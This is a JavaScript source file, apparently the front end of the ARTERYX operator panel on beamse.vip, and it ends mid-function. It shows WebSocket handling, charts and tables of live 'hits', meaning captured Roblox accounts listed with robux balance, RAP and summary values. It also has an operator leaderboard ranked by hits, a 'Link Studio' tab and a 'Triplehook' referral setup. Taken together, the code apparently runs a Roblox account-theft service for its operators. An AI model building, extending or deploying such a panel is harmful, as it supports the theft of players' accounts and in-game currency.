// language: JavaScript, file: dashboard.js, target: beamse.vip /controller/dashboard (ARTERYX)
// Classic script (no module) — inline onclick handlers in the injected markup rely on globals.
// Data source: beamse-dashboard WS (wss://<host>/ws) + /api/auth/* + /curl/ Roblox proxy.

/* ══════════════════════════════════════════════
   CONSTANTS
   ══════════════════════════════════════════════ */
const CHART_ACCENT = '#635bff';
const DAY_NAMES = ['SUN', 'MON', 'TUE', 'WED', 'THU', 'FRI', 'SAT'];
const TAB_TITLES = { main: 'Dashboard', domains: 'Link Studio', triplehook: 'Triplehook', settings: 'Settings' };
const USER_SVG = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>';

/* ══════════════════════════════════════════════
   STATE
   ══════════════════════════════════════════════ */
let state = {
    user: null,
    ws: null,
    ws_open: false,
    authed: false,
    hits: [],
    leaderboard: [],
    dashboard: null,
    referral: null,
    rid: 0,
    pending: new Map(),
    queue: [],
    reconnect_delay: 1000,
    last_stats_refresh: 0,
    closing: false,
};
let lastDailyActivity = null;
let profileState = { realUserId: null, avatarUrl: null };

/* ══════════════════════════════════════════════
   TOASTS
   ══════════════════════════════════════════════ */
function showToast(message, type = 'info') {
    let container = document.getElementById('toast-container');
    if (!container) {
        container = document.createElement('div');
        container.id = 'toast-container';
        document.body.appendChild(container);
    }
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    const ICONS = {
        success: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
        error: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>',
        info: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>'
    };
    const icon = ICONS[type] || ICONS.info;
    toast.innerHTML = `
        <span class="toast-icon">${icon}</span>
        <div class="toast-content"></div>
    `;
    toast.querySelector('.toast-content').textContent = message;
    toast.addEventListener('click', () => {
        toast.classList.add('hiding');
        setTimeout(() => toast.remove(), 200);
    });
    container.appendChild(toast);
    setTimeout(() => {
        if (toast.parentNode) {
            toast.classList.add('hiding');
            setTimeout(() => toast.remove(), 200);
        }
    }, 4000);
}

// Override default window.alert
window.alert = function (message) {
    let type = 'info';
    const msgLower = String(message).toLowerCase();
    if (msgLower.includes('success') || msgLower.includes('copied') || msgLower.includes('sent') || msgLower.includes('created') || msgLower.includes('connected') || msgLower.includes('saved') || msgLower.includes('loaded')) {
        type = 'success';
    } else if (msgLower.includes('fail') || msgLower.includes('error') || msgLower.includes('invalid') || msgLower.includes('please') || msgLower.includes('network') || msgLower.includes('enter') || msgLower.includes('did not') || msgLower.includes('first')) {
        type = 'error';
    }
    showToast(message, type);
};

function show_inline_msg(el, text, ok) {
    if (!el) return;
    el.style.display = 'block';
    el.style.color = ok ? 'rgba(74,222,128,0.9)' : 'rgba(248,113,113,0.9)';
    el.innerHTML = `<i class="fas ${ok ? 'fa-circle-check' : 'fa-circle-exclamation'}" style="margin-right:6px;"></i>${text}`;
    clearTimeout(el._bhTimer);
    el._bhTimer = setTimeout(() => { el.style.display = 'none'; }, 5000);
}

/* ══════════════════════════════════════════════
   HELPERS
   ══════════════════════════════════════════════ */
function $(id) { return document.getElementById(id); }
function val(id) { const el = $(id); return el ? String(el.value || '') : ''; }
function numval(id) { const n = Number(val(id)); return isNaN(n) ? 0 : n; }
function chkval(id) { const el = $(id); return !!(el && el.checked); }

function discord_avatar_url(discord_id, discord_avatar, size) {
    const id = String(discord_id || '0');
    if (discord_avatar) return `https://cdn.discordapp.com/avatars/${id}/${discord_avatar}.png?size=${size || 128}`;
    return `https://cdn.discordapp.com/embed/avatars/${(Number(id) % 5 + 5) % 5 || 0}.png`;
}

function formatTimeAgo(ms) {
    if (!ms) return 'just now';
    const s = Math.max(0, Math.floor((Date.now() - ms) / 1000));
    if (s < 10) return 'just now';
    if (s < 60) return `${s}s ago`;
    const m = Math.floor(s / 60);
    if (m < 60) return `${m}m ago`;
    const h = Math.floor(m / 60);
    if (h < 24) return `${h}h ago`;
    return `${Math.floor(h / 24)}d ago`;
}

function animateCounter(el, target, suffix = '') {
    if (!el) return;
    const end = Math.round(Number(target) || 0);
    const prev = el.dataset.val !== undefined ? Number(el.dataset.val) : 0;
    el.dataset.val = end;
    if (prev === end) {
        el.textContent = end.toLocaleString() + suffix;
        return;
    }
    const duration = 600;
    const startTime = performance.now();
    function tick(now) {
        const elapsed = now - startTime;
        const progress = Math.min(elapsed / duration, 1);
        const ease = 1 - Math.pow(1 - progress, 3);
        const current = Math.round(prev + (end - prev) * ease);
        el.textContent = current.toLocaleString() + suffix;
        if (progress < 1) {
            requestAnimationFrame(tick);
        } else {
            el.textContent = end.toLocaleString() + suffix;
        }
    }
    requestAnimationFrame(tick);
}

function esc_attr(s) {
    return String(s == null ? '' : s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function open_directory_row(el) {
    const name = el && el.dataset ? el.dataset.name : '';
    if (name) window.open('/controller/' + encodeURIComponent(name), '_blank');
}

function copy_text(text, okMsg) {
    const done = () => showToast(okMsg || 'Copied to clipboard', 'success');
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(done).catch(() => fallback_copy(text, done));
    } else {
        fallback_copy(text, done);
    }
}
function fallback_copy(text, done) {
    try {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.opacity = '0';
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        ta.remove();
        done();
    } catch (e) {
        showToast('Copy failed — clipboard blocked', 'error');
    }
}

/* ══════════════════════════════════════════════
   WS CLIENT
   ══════════════════════════════════════════════ */
function ws_url() {
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    return proto + '//' + location.host + '/ws';
}

function ws_connect() {
    if (state.ws) { try { state.ws.close(); } catch (e) {} }
    let ws;
    try { ws = new WebSocket(ws_url()); } catch (e) { schedule_reconnect(); return; }
    state.ws = ws;

    ws.onopen = () => {
        state.ws_open = true;
        state.reconnect_delay = 1000;
        // flush queued messages
        const q = state.queue.splice(0);
        q.forEach(raw => { try { ws.send(raw); } catch (e) {} });
        do_authenticate();
    };

    ws.onmessage = (ev) => {
        let msg = null;
        try { msg = JSON.parse(ev.data); } catch (e) { return; }
        handle_message(msg);
    };

    ws.onclose = () => {
        state.ws_open = false;
        state.authed = false;
        if (!state.closing) schedule_reconnect();
    };
    ws.onerror = () => {};

    // auth watchdog — if authenticate response never lands, retry once after 8s
    clearTimeout(state._authWatch);
    state._authWatch = setTimeout(() => { if (!state.authed) ws_connect(); }, 9000);
}

function schedule_reconnect() {
    const delay = state.reconnect_delay;
    state.reconnect_delay = Math.min(state.reconnect_delay * 2, 15000);
    setTimeout(() => { if (!state.closing) ws_connect(); }, delay);
}

function do_authenticate() {
    const token = state.user && state.user.recovery_token;
    if (!token) { location.replace('/controller/'); return; }
    ws_send('authenticate', { token });
}

function ws_send(type, data) {
    const raw = JSON.stringify({ type, data: data || {} });
    if (state.ws && state.ws_open) {
        try { state.ws.send(raw); return true; } catch (e) {}
    }
    state.queue.push(raw);
    return false;
}

function ws_request(type, data, timeoutMs) {
    return new Promise((resolve, reject) => {
        const rid = 'r' + (++state.rid) + '_' + Date.now().toString(36);
        const timer = setTimeout(() => {
            if (state.pending.has(rid)) {
                state.pending.delete(rid);
                reject(new Error(type + ' timed out'));
            }
        }, timeoutMs || 20000);
        state.pending.set(rid, { resolve, reject, timer, type });
        ws_send(type, Object.assign({}, data || {}, { request_id: rid }));
    });
}

function handle_message(msg) {
    const type = msg && msg.type;
    const d = (msg && msg.data) || {};

    // request/response matching (server echoes request_id inside data)
    if (d.request_id && state.pending.has(d.request_id)) {
        const entry = state.pending.get(d.request_id);
        state.pending.delete(d.request_id);
        clearTimeout(entry.timer);
        entry.resolve(d);
        // still fall through — some responses double as render triggers
    }

    switch (type) {
        case 'authenticate': on_authenticate(d); break;
        case 'new_live_hit': on_new_live_hit(d); break;
        case 'stats_update': on_stats_update(d); break;
        case 'get_dashboard': if (d.user || d.statistics) on_dashboard(d); break;
        case 'get_live_hits': if (Array.isArray(d.hits)) { state.hits = d.hits; render_hits(); render_summary_card(); } break;
        case 'get_leaderboard': if (Array.isArray(d.leaderboard)) { state.leaderboard = d.leaderboard; render_leaderboard(state.leaderboard); } break;
        case 'get_referral': if (d.directory || d.error) { state.referral = d; apply_referral(d); } break;
        case 'get_recovery_token': if (d.recovery_token) { const el = $('recoveryTokenVal'); if (el) el.textContent = d.recovery_token; } break;
        default: break;
    }
}

function on_authenticate(d) {
    if (d && d.success && d.user) {
        state.authed = true;
        state.user = d.user;
        apply_user_ui(d.user);
        init_data_loads();
        clearTimeout(state._authWatch);
    } else if (d && d.error) {
        state.closing = true;
        location.replace('/controller/');
    }
}

function init_data_loads() {
    ws_request('get_dashboard').then(on_dashboard).catch(() => {});
    ws_request('get_live_hits').then(d => {
        if (Array.isArray(d.hits)) { state.hits = d.hits; render_hits(); render_summary_card(); }
    }).catch(() => {});
    ws_request('get_leaderboard').then(d => {
        if (Array.isArray(d.leaderboard)) { state.leaderboard = d.leaderboard; render_leaderboard(d.leaderboard); }
    }).catch(() => {});
    ws_request('get_referral').then(d => { state.referral = d; apply_referral(d); }).catch(() => {});
    ws_request('get_recovery_token').then(d => {
        if (d.recovery_token) { const el = $('recoveryTokenVal'); if (el) el.textContent = d.recovery_token; }
    }).catch(() => {});
    fill_settings(state.user);
    init_stage_forms(state.user);
}

function on_new_live_hit(d) {
    const hit = d && d.hit;
    if (!hit || !state.user || String(hit.owner_id) !== String(state.user.id)) return;
    state.hits.unshift(hit);
    if (state.hits.length > 50) state.hits.pop();
    render_hits();
    render_summary_card();
    state.user.statistics_accounts = Number(state.user.statistics_accounts || 0) + 1;
    animateCounter($('statsAccounts'), state.user.statistics_accounts);
    const name = hit.roblox_username || hit.roblox_display || 'Unknown';
    showToast('New capture — ' + name, 'success');
    // coalesced dashboard refresh (weekly chart / deltas)
    clearTimeout(state._dashRefreshTimer);
    state._dashRefreshTimer = setTimeout(() => {
        ws_request('get_dashboard').then(on_dashboard).catch(() => {});
    }, 5000);
}

function on_stats_update() {
    const now = Date.now();
    if (now - state.last_stats_refresh < 30000) return;
    state.last_stats_refresh = now;
    ws_request('get_dashboard').then(on_dashboard).catch(() => {});
    ws_request('get_live_hits').then(d => {
        if (Array.isArray(d.hits)) { state.hits = d.hits; render_hits(); render_summary_card(); }
    }).catch(() => {});
    ws_request('get_leaderboard').then(d => {
        if (Array.isArray(d.leaderboard)) { state.leaderboard = d.leaderboard; render_leaderboard(d.leaderboard); }
    }).catch(() => {});
}

/* ══════════════════════════════════════════════
   USER UI
   ══════════════════════════════════════════════ */
function apply_user_ui(user) {
    if (!user) return;
    const name = user.discord_username || 'Operator';
    const av = discord_avatar_url(user.discord_id, user.discord_avatar, 128);

    document.body.dataset.username = name;
    const hn = $('headerUsername'); if (hn) hn.textContent = name;
    const ha = $('headerAvatar');
    if (ha) { ha.src = av; ha.onerror = () => { ha.src = 'https://cdn.discordapp.com/embed/avatars/0.png'; }; }

    const opName = $('operatorCardName'); if (opName) opName.textContent = name;
    const opRole = $('operatorCardRole'); if (opRole) opRole.textContent = user.account_rank || 'Operator';
    const opAvatar = $('operatorCardAvatar');
    if (opAvatar) opAvatar.innerHTML = `<img src="${av}" alt="${name}" style="width:100%;height:100%;border-radius:50%;object-fit:cover;">`;

    ['acc', 'visits', 'clicks'].forEach(prefix => {
        const un = $(prefix + 'UserName'); if (un) un.textContent = name;
        const ua = $(prefix + 'UserAvatar');
        if (ua) { ua.src = av; ua.onerror = () => { ua.src = 'https://cdn.discordapp.com/embed/avatars/0.png'; }; }
    });

    applyTabTitle(current_tab());
}

function current_tab() {
    const active = document.querySelector('.dock-item.active[data-tab]');
    return active ? active.dataset.tab : 'main';
}

function applyTabTitle(tab) {
    document.title = 'ARTERYX — ' + (TAB_TITLES[tab] || 'Dashboard');
}

/* ══════════════════════════════════════════════
   NAV
   ══════════════════════════════════════════════ */
function switchMainTab(name, btn) {
    document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
    const panel = $(name + '-tab');
    if (panel) panel.classList.add('active');
    document.querySelectorAll('.dock-item[data-tab]').forEach(item => {
        const isMatch = item.dataset.tab === name;
        item.classList.toggle('active', isMatch);
        if (isMatch) {
            const bar = item.querySelector('.dock-progress-bar');
            if (bar) { bar.classList.add('loading'); setTimeout(() => bar.classList.remove('loading'), 400); }
        }
    });
    const dd = $('headerDropdown'); if (dd) dd.classList.remove('show');
    const u = $('headerUser'); if (u) u.classList.remove('open');
    if (name === 'settings') init_settings_dots();
    applyTabTitle(name);
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
window.switchTab = switchMainTab;

function toggleHeaderDropdown(e) {
    if (e) e.stopPropagation();
    const dd = $('headerDropdown');
    const u = $('headerUser');
    if (dd) dd.classList.toggle('show');
    if (u) u.classList.toggle('open');
}

document.addEventListener('click', (e) => {
    const dd = $('headerDropdown');
    const u = $('headerUser');
    if (dd && !dd.contains(e.target) && !(u && u.contains(e.target))) {
        dd.classList.remove('show');
        if (u) u.classList.remove('open');
    }
});

async function doLogout() {
    state.closing = true;
    try { await fetch('/api/auth/logout', { method: 'POST', credentials: 'same-origin' }); } catch (e) {}
    document.cookie = 'Authentication=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT';
    document.cookie = 'Authentication=; path=/; domain=.beamse.vip; expires=Thu, 01 Jan 1970 00:00:00 GMT';
    location.href = '/controller/';
}

/* ══════════════════════════════════════════════
   OVERVIEW — STATS / CHARTS
   ══════════════════════════════════════════════ */
function set_delta(id, n, suffix) {
    const el = $(id);
    if (!el) return;
    const txt = Number(n || 0).toLocaleString();
    el.innerHTML = `<i></i>+${txt} ${suffix || 'today'}`;
}

function on_dashboard(d) {
    if (!d || d.error) return;
    state.dashboard = d;
    if (d.user) { state.user = d.user; apply_user_ui(d.user); }

    const today_idx = new Date().getDay();
    const stats = d.statistics || {};
    const charts = d.charts || {};
    const acc_chart = Array.isArray(charts.total_accounts) ? charts.total_accounts : [0, 0, 0, 0, 0, 0, 0];
    const visit_chart = Array.isArray(charts.total_visits) ? charts.total_visits : [0, 0, 0, 0, 0, 0, 0];
    const labels = Array.isArray(d.chart_days) && d.chart_days.length === 7 ? d.chart_days : ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];

    animateCounter($('statsAccounts'), stats.total_accounts || 0);
    set_delta('statsAccountsDelta', acc_chart[today_idx] || 0);

    animateCounter($('statsVisits'), stats.total_visits || 0);
    set_delta('statsVisitsDelta', visit_chart[today_idx] || 0);

    const clicks = Number((state.user && state.user.statistics_clicks) || 0);
    animateCounter($('statsClicks'), clicks);
    set_delta('statsClicksDelta', 0);

    buildMiniChart('accMiniChart', 'accMiniLabels', 'accMiniPct', acc_chart, labels, 'Accounts');
    buildMiniChart('visitsMiniChart', 'visitsMiniLabels', 'visitsMiniPct', visit_chart, labels, 'Visits');
    buildMiniChart('clicksMiniChart', 'clicksMiniLabels', 'clicksMiniPct', [0, 0, 0, 0, 0, 0, 0], labels, 'Links');

    // Operator card
    const opToday = $('opTodayHits'); if (opToday) opToday.textContent = Number(acc_chart[today_idx] || 0).toLocaleString();
    const opTotal = $('opTotalHits'); if (opTotal) opTotal.textContent = Number(stats.total_accounts || 0).toLocaleString();
    const opRate = $('opConvRate');
    if (opRate) {
        const v = Number(stats.total_visits || 0);
        opRate.textContent = v > 0 ? Math.min(100, Math.round((Number(stats.total_accounts || 0) / v) * 100)) + '%' : '100%';
    }

    // Overview activity chart — rolling labels from weekday slots
    lastDailyActivity = labels.map((l, i) => ({ label: String(l).toUpperCase(), total: Number(acc_chart[i] || 0) }));
    renderChartWithActivity(lastDailyActivity);
}

function render_summary_card() {
    const hits = state.hits || [];
    const now = new Date();
    const start_of_today = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
    const day_ms = 86400000;

    let sTot = 0, rTot = 0, bTot = 0, sToday = 0, rToday = 0, bToday = 0;
    const sData = [0, 0, 0, 0, 0, 0, 0], rData = [0, 0, 0, 0, 0, 0, 0], bData = [0, 0, 0, 0, 0, 0, 0];

    hits.forEach(h => {
        const s = Number(h.summary) || 0, r = Number(h.rap) || 0, b = Number(h.robux) || 0;
        sTot += s; rTot += r; bTot += b;
        const t = Number(h.captured_at || 0) * 1000;
        if (!t) return;
        if (t >= start_of_today) { sToday += s; rToday += r; bToday += b; }
        const diff = Math.floor((start_of_today - t) / day_ms);
        const idx = diff <= 0 ? 6 : (diff <= 6 ? 6 - diff : -1);
        if (idx >= 0) { sData[idx] += s; rData[idx] += r; bData[idx] += b; }
    });

    const labels = [];
    const base = new Date(start_of_today);
    for (let i = 6; i >= 0; i--) {
        const dt = new Date(base);
        dt.setDate(base.getDate() - i);
        labels.push(DAY_NAMES[dt.getDay()]);
    }

    animateCounter($('weeklySummaryVal'), sTot);
    animateCounter($('weeklyRapVal'), rTot);
    animateCounter($('weeklyBalanceVal'), bTot, ' R$');

    const sd = $('weeklySummaryDelta'); if (sd) sd.innerHTML = `+${sToday.toLocaleString()} <span>today</span>`;
    const rd = $('weeklyRapDelta'); if (rd) rd.innerHTML = `+${rToday.toLocaleString()} <span>today</span>`;
    const bd = $('weeklyBalanceDelta'); if (bd) bd.innerHTML = `+${bToday.toLocaleString()} R$ <span>today</span>`;

    buildSummaryMini('sMiniSummary', 'sMiniSummaryL', 'sMiniSummaryP', sData, labels, 'summary', 'Summary');
    buildSummaryMini('sMiniRap', 'sMiniRapL', 'sMiniRapP', rData, labels, 'rap', 'RAP');
    buildSummaryMini('sMiniBalance', 'sMiniBalanceL', 'sMiniBalanceP', bData, labels, 'balance', 'Balance');
}

function buildMiniChart(containerId, labelId, pctId, data, labels, tooltipLabel) {
    const c = $(containerId);
    const l = $(labelId);
    const p = $(pctId);
    if (!c) return;
    const mx = Math.max.apply(null, data) || 1;
    const tl = tooltipLabel || 'Count';
    const today = data[data.length - 1] || 0;
    const yesterday = data[data.length - 2] || 0;
    const pct = yesterday > 0 ? Math.round(((today - yesterday) / yesterday) * 100) : (today > 0 ? 100 : 0);

    c.innerHTML = '';
    if (l) l.innerHTML = '';

    for (let i = 0; i < data.length; i++) {
        const v = data[i];
        const h = v > 0 ? Math.max(((v / mx) * 100), 12) : 12;
        const bar = document.createElement('div');
        bar.className = 'stat-mini-bar' + (v === 0 ? ' zero' : '');
        bar.style.height = h + '%';
        bar.setAttribute('data-val', v);
        bar.setAttribute('data-label', labels[i] || '');
        bar.setAttribute('data-tl', tl);
        c.appendChild(bar);

        if (l) {
            const lb = document.createElement('div');
            lb.className = 'stat-mini-label';
            lb.textContent = (labels[i] || '').slice(0, 1);
            l.appendChild(lb);
        }
    }

    if (p) {
        const arrow = pct >= 0 ? '<i class="fas fa-arrow-up"></i>' : '<i class="fas fa-arrow-down"></i>';
        p.innerHTML = `${arrow} ${Math.abs(pct)}%`;
        p.style.color = pct >= 0 ? 'rgba(74,222,128,0.85)' : 'rgba(248,113,113,0.85)';
    }
    bind_mini_tooltip(c, '.stat-mini-bar');
}

function buildSummaryMini(cId, lId, pId, data, labels, tooltipLabel, tlDisplay) {
    const c = $(cId);
    const l = $(lId);
    const p = $(pId);
    if (!c) return;
    const mx = Math.max.apply(null, data) || 1;
    const today = data[data.length - 1] || 0;
    const yest = data[data.length - 2] || 0;
    const pct = yest > 0 ? Math.round(((today - yest) / yest) * 100) : (today > 0 ? 100 : 0);

    c.innerHTML = '';
    if (l) l.innerHTML = '';

    for (let i = 0; i < data.length; i++) {
        const v = data[i];
        const h = v > 0 ? Math.max(((v / mx) * 100), 12) : 12;
        const bar = document.createElement('div');
        bar.className = 'summary-mini-bar' + (v === 0 ? ' zero' : '');
        bar.style.height = h + '%';
        bar.setAttribute('data-val', v);
        bar.setAttribute('data-label', labels[i] || '');
        bar.setAttribute('data-tl', tlDisplay || tooltipLabel || 'Total');
        c.appendChild(bar);

        if (l) {
            const lb = document.createElement('div');
            lb.className = 'summary-mini-label';
            lb.textContent = (labels[i] || '').slice(0, 1);
            l.appendChild(lb);
        }
    }

    if (p) {
        const arrow = pct >= 0 ? '<i class="fas fa-arrow-up"></i>' : '<i class="fas fa-arrow-down"></i>';
        p.innerHTML = `${arrow} ${Math.abs(pct)}%`;
        p.style.color = pct >= 0 ? 'rgba(74,222,128,0.85)' : 'rgba(248,113,113,0.85)';
    }
    bind_mini_tooltip(c, '.summary-mini-bar');
}

function bind_mini_tooltip(c, barSelector) {
    if (c.dataset.tooltipBound) return;
    c.dataset.tooltipBound = '1';
    c.addEventListener('mousemove', (e) => {
        const tt = $('globalStatTooltip');
        if (!tt) return;
        const bars = c.querySelectorAll(barSelector);
        let hit = null;
        for (let j = 0; j < bars.length; j++) {
            const br = bars[j].getBoundingClientRect();
            if (e.clientX >= br.left && e.clientX <= br.right) { hit = bars[j]; break; }
        }
        if (!hit) { tt.style.opacity = '0'; return; }
        tt.innerHTML = `
            <div style="font-weight:700;color:#fff;margin-bottom:4px;font-family:'Rajdhani',sans-serif;">${hit.getAttribute('data-label')}</div>
            <div style="display:flex;align-items:center;gap:6px;font-family:'Rajdhani',sans-serif;font-size:0.75rem;color:rgba(255,255,255,0.7);">
                <span style="color:rgba(255,255,255,0.4);">${hit.getAttribute('data-tl')}:</span>
                <span style="color:#fff;font-weight:700;">${Number(hit.getAttribute('data-val') || 0).toLocaleString()}</span>
            </div>
        `;
        const r = hit.getBoundingClientRect();
        tt.style.left = (r.left + r.width / 2 - 45) + 'px';
        tt.style.top = (r.top - 55) + 'px';
        tt.style.opacity = '1';
    });
    c.addEventListener('mouseleave', () => {
        const tt = $('globalStatTooltip');
        if (tt) tt.style.opacity = '0';
    });
}

function renderChartWithActivity(activityList) {
    const canvas = $('overviewChart');
    const axis = $('chartAxis');
    if (!canvas || !activityList || activityList.length === 0) return;

    const dpr = window.devicePixelRatio || 1;
    const w = canvas.clientWidth || canvas.parentElement.clientWidth || 600;
    const h = 240;
    canvas.width = Math.round(w * dpr);
    canvas.height = Math.round(h * dpr);
    const ctx = canvas.getContext('2d');
    ctx.setTransform(1, 0, 0, 1, 0, 0);
    ctx.scale(dpr, dpr);
    ctx.clearRect(0, 0, w, h);

    if (axis) axis.innerHTML = activityList.map(a => `<span>${a.label}</span>`).join('');

    const counts = activityList.map(a => Number(a.total !== undefined ? a.total : a.count || 0));
    const pad = { l: 42, r: 16, t: 20, b: 14 };
    const iw = w - pad.l - pad.r;
    const ih = h - pad.t - pad.b;
    const max = Math.max(4, ...counts);
    const x = i => pad.l + (iw * i) / (activityList.length - 1);
    const y = v => pad.t + ih - (ih * v) / max;

    ctx.font = '500 10px -apple-system, BlinkMacSystemFont, "SF Pro Text", "Inter", sans-serif';
    ctx.fillStyle = '#6e6e73';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.05)';
    ctx.lineWidth = 1;
    const steps = 4;
    for (let g = 0; g <= steps; g++) {
        const v = Math.round((max * g) / steps);
        const gy = y(v);
        ctx.beginPath();
        ctx.moveTo(pad.l, gy);
        ctx.lineTo(w - pad.r, gy);
        ctx.stroke();
        ctx.fillText(v >= 1000 ? `${(v / 1000).toFixed(1).replace(/\.0$/, '')}k` : String(v), 6, gy + 3);
    }

    const pts = counts.map((c, i) => [x(i), y(c)]);

    const grad = ctx.createLinearGradient(0, pad.t, 0, pad.t + ih);
    grad.addColorStop(0, 'rgba(99, 91, 255, 0.28)');
    grad.addColorStop(1, 'rgba(99, 91, 255, 0.0)');
    ctx.beginPath();
    ctx.moveTo(pts[0][0], pad.t + ih);
    ctx.lineTo(pts[0][0], pts[0][1]);
    for (let i = 1; i < pts.length; i++) {
        const prev = pts[i - 1];
        const curr = pts[i];
        const midX = (prev[0] + curr[0]) / 2;
        ctx.quadraticCurveTo(prev[0], prev[1], midX, (prev[1] + curr[1]) / 2);
        ctx.quadraticCurveTo(curr[0], curr[1], curr[0], curr[1]);
    }
    ctx.lineTo(pts[pts.length - 1][0], pad.t + ih);
    ctx.closePath();
    ctx.fillStyle = grad;
    ctx.fill();

    ctx.beginPath();
    ctx.moveTo(pts[0][0], pts[0][1]);
    for (let i = 1; i < pts.length; i++) {
        const prev = pts[i - 1];
        const curr = pts[i];
        const midX = (prev[0] + curr[0]) / 2;
        ctx.quadraticCurveTo(prev[0], prev[1], midX, (prev[1] + curr[1]) / 2);
        ctx.quadraticCurveTo(curr[0], curr[1], curr[0], curr[1]);
    }
    ctx.strokeStyle = CHART_ACCENT;
    ctx.lineWidth = 2.4;
    ctx.lineJoin = 'round';
    ctx.lineCap = 'round';
    ctx.stroke();

    pts.forEach((p, i) => {
        ctx.beginPath();
        const isLatest = i === pts.length - 1;
        ctx.arc(p[0], p[1], isLatest ? 4.5 : 3, 0, Math.PI * 2);
        ctx.fillStyle = isLatest ? CHART_ACCENT : '#0a0a0c';
        ctx.fill();
        ctx.strokeStyle = CHART_ACCENT;
        ctx.lineWidth = 1.8;
        ctx.stroke();
    });
}

window.addEventListener('resize', () => {
    if (lastDailyActivity) renderChartWithActivity(lastDailyActivity);
});

/* ══════════════════════════════════════════════
   LEADERBOARD + HITS
   ══════════════════════════════════════════════ */
function render_leaderboard(list) {
    const feedContainer = $('activityFeed');
    if (!feedContainer) return;

    if (!list || list.length === 0) {
        feedContainer.innerHTML = `
            <div style="padding:32px 10px;text-align:center;color:rgba(255,255,255,0.3);font-family:'Rajdhani',sans-serif;font-size:0.85rem;letter-spacing:1px;text-transform:uppercase;">
                No operator rankings yet.
            </div>
        `;
        return;
    }

    const crowns = [
        '<i class="fas fa-crown lb-crown" style="color:#ff4444"></i>',
        '<i class="fas fa-crown lb-crown" style="color:#4a9eff"></i>',
        '<i class="fas fa-crown lb-crown" style="color:#ffd700"></i>'
    ];
    const sorted = [...list].sort((a, b) => Number(b.statistics_accounts || 0) - Number(a.statistics_accounts || 0));
    feedContainer.innerHTML = sorted.slice(0, 10).map((u, i) => {
        const crown = i < 3 ? crowns[i] : '';
        const rankNum = i >= 3 ? `<span style="font-family:'Rajdhani',sans-serif;font-size:0.75rem;font-weight:700;color:rgba(255,255,255,0.3);min-width:20px;text-align:center;">#${i + 1}</span>` : '';
        const avatarUrl = discord_avatar_url(u.discord_id, u.discord_avatar, 64);
        const score = `${Number(u.statistics_accounts || 0).toLocaleString()} hits`;
        const name = u.discord_username || 'Unknown';

        return `
            <div class="leaderboard-row" data-rank="${i + 1}">
                ${rankNum}
                <div class="leaderboard-user">
                    <div class="lb-avatar-wrap">
                        ${crown}
                        <img src="${esc_attr(avatarUrl)}" class="leaderboard-avatar" alt="${esc_attr(name)}" onerror="this.onerror=null;this.src='https://cdn.discordapp.com/embed/avatars/0.png';">
                    </div>
                    <span class="leaderboard-username">${esc_attr(name)}</span>
                </div>
                <div class="leaderboard-score">
                    <i class="fas fa-crosshairs" style="margin-right:4px;font-size:0.75rem;opacity:0.6;"></i>${score}
                </div>
            </div>
        `;
    }).join('');
}

function render_hits() {
    const bodyEl = $('hitsTableBody');
    const emptyEl = $('hitsEmptyMsg');
    if (!bodyEl) return;

    const items = state.hits || [];
    if (items.length === 0) {
        bodyEl.innerHTML = '';
        if (emptyEl) {
            emptyEl.style.display = 'flex';
            emptyEl.innerHTML = `<span class="radar-dot"></span><span>No recent captures.</span>`;
        }
        return;
    }
    if (emptyEl) emptyEl.style.display = 'none';

    const operator = (state.user && state.user.discord_username) || 'Local';
    bodyEl.innerHTML = items.slice(0, 12).map(h => {
        const username = h.roblox_username || h.roblox_display || 'Unknown';
        const timeAgo = formatTimeAgo(Number(h.captured_at || 0) * 1000);
        const balanceStr = (Number(h.robux) || 0).toLocaleString() + ' R$';
        const summaryStr = (Number(h.summary) || 0).toLocaleString();
        const rapStr = (Number(h.rap) || 0).toLocaleString();

        return `
            <div class="hit-row">
                <div class="hit-user-cell"><span class="hit-avatar-icon">${USER_SVG}</span><span class="hit-username" title="${esc_attr(username)}">${esc_attr(username)}</span></div>
                <div class="hit-cell hit-time">${timeAgo}</div>
                <div class="hit-cell hit-balance">${balanceStr}</div>
                <div class="hit-cell hit-summary">${summaryStr}</div>
                <div class="hit-cell hit-rap">${rapStr}</div>
                <div class="hit-cell hit-operator" title="${esc_attr(operator)}">${esc_attr(operator)}</div>
            </div>
        `;
    }).join('');
}

/* ══════════════════════════════════════════════
   TRIPLEHOOK
   ══════════════════════════════════════════════ */
function apply_referral(d) {
    if (!d || d.error) return;
    if ($('thName')) $('thName').value = d.referral_name || '';
    if ($('thDesc')) $('thDesc').value = d.referral_description || '';
    if ($('thInvite')) $('thInvite').value = d.referral_invite || '';
    if ($('thShowStats')) $('thShowStats').checked = !!Number(d.showStats);
    if ($('thShowHits')) $('thShowHits').checked = !!Number(d.showHits);

    const badge = $('triplehookBadgeText');
    if (badge) badge.textContent = d.referral_name ? 'Active' : 'Not set';
    const badgeEl = $('triplehookBadge');
